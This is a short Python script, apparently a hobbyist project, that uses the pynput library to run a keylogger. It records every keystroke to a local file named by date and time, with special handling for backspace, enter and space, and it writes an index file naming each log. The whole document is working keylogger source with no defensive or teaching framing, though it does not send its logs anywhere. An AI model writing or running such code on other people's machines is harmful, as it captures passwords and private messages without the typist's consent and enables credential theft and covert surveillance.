#imported modules
from pynput import keyboard
from datetime import datetime

#getting current date and time
now = datetime.now()
now = (now.strftime("%Y-%m-%d %H-%M"))


#creating and opening file
with open("log_files_id_info.txt", "w") as file:
    file.write(f"key loger file at {now} is named {now}_Keylogger_data \n")

with open(f"{now}_Keylogger_data" , "a") as file:
    file.write(" ")


#function triggers when a key is pressed
def pressed(key):
    try:
        key_pressed = format(key.char)
        with open(f"{now}_Keylogger_data" , "a") as file:

            file.write(f'{key_pressed}')

    except:
        key_pressed = format(key)
        with open(f"{now}_Keylogger_data", "a") as file:
            if key_pressed == 'Key.backspace':
                file.write("*")
            if key_pressed == "Key.enter":
                file.write('\n')
            if key_pressed == "Key.space":
                file.write(" ")

#start the listening
with keyboard.Listener(
    on_press=pressed) as listner:
    listner.join()